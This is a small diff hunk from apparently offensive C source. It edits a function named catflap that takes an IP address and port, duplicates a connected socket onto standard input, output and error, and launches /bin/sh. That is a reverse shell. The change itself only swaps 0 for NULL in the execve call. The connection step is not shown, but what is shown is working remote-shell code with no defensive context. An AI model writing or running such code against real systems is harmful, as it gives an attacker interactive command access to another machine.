@@ -13,7 +13,7 @@ int catflap(const char *ip, int port)
 	dup2(conn_sock, 1);
 	dup2(conn_sock, 2);
 
-	execve("/bin/sh", 0, 0); 
+	execve("/bin/sh", NULL, NULL); 
 	return 0;
 }	
 
